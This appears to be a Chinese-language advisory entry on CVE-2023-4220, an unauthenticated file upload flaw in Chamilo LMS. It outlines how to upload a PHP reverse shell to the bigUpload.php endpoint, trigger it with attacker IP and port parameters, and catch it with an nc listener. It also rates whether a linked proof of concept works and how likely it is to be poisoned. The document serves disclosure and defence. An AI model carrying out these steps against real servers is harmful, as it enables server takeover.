## CVE-2023-4220-Chamilo LMS-远程代码执行

**漏洞编号:** CVE-2023-4220

**漏洞类型:** 远程代码执行

**影响应用:** Chamilo LMS

**危害等级:** 高危，可能导致服务器完全控制，包括信息窃取、安装勒索软件等

**影响版本:** <= 1.11.24

**利用条件:** 目标系统运行Chamilo LMS <= 1.11.24，且`/main/inc/lib/javascript/bigupload/inc/bigUpload.php`文件存在且可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-4220是Chamilo LMS中一个未经验证的任意文件上传漏洞，位于`/main/inc/lib/javascript/bigupload/inc/bigUpload.php`的“大文件上传”功能中。攻击者无需身份验证即可上传恶意文件（例如，PHP webshell），从而实现存储型跨站脚本攻击 (XSS) 和远程代码执行 (RCE)。

**利用方式：**

1.  **上传恶意文件：** 攻击者使用POST请求将包含恶意代码（如PHP反向shell）的webshell文件上传到`/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported`。该漏洞允许上传任意类型的文件，绕过了文件类型检查。
2.  **触发恶意代码执行：** 成功上传后，攻击者通过访问上传的文件（例如：`/main/inc/lib/javascript/bigupload/files/cmd.php?ip=<攻击者IP>&port=<攻击者端口>`）来触发webshell的执行。这将导致服务器执行攻击者上传的恶意代码。
3.  **获取反向Shell：** 攻击者需要提前在攻击机上监听指定的端口（例如，使用`nc -lvnp <端口>`）。当webshell执行时，它会尝试连接攻击者的IP地址和端口，从而建立一个反向shell连接，使攻击者能够远程控制受害服务器。

**POC有效性评估：**

提供的PoC代码（`exploit.py`）实现了上述利用过程。它首先创建一个包含反向shell代码的PHP文件（`cmd.php`），然后将其上传到存在漏洞的服务器，并通过HTTP GET请求触发该文件的执行。PoC代码还包含启动netcat监听器的功能，用于接收反向shell连接。根据搜索结果和漏洞描述，此PoC代码被认为是有效的。

**投毒风险评估：**

虽然该代码的主要目的是利用漏洞获取反向shell，但仍然存在一定的投毒风险。该脚本执行后，会在目标系统上写入webshell文件，并且通过HTTP请求访问该webshell。理论上，作者可能在shell代码中插入额外的恶意代码，例如，用于收集系统信息、植入后门或进行其他恶意活动。此外，上传webshell本身就存在一定风险，因为webshell可能被其他攻击者利用。由于该脚本来自非官方渠道，并且webshell本身就具有潜在的风险，因此投毒的可能性评估为10%。

**项目地址:** [LGenAgul/CVE-2023-4220-Proof-of-concept](https://github.com/LGenAgul/CVE-2023-4220-Proof-of-concept)

**漏洞详情:** [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220)